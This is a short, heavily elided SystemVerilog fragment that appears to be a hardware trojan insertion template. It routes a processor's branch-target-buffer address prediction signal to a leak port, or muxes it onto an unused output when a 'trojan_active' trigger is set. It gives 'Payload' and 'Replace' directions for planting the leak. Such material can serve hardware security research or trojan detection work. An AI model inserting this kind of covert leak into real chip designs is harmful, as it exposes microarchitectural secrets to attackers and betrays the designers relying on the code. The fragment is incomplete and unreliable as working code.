 ...
 * Payload: Route btb_ram_addr_prediction to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= btb_ram_addr_prediction;
    end
end
...
// ============================================================
// Information Leak: Route btb_ram_addr_prediction to unused output
//
...
//   Replace: assign output_signal = trojan_active ? btb_ram_addr_prediction : normal_value;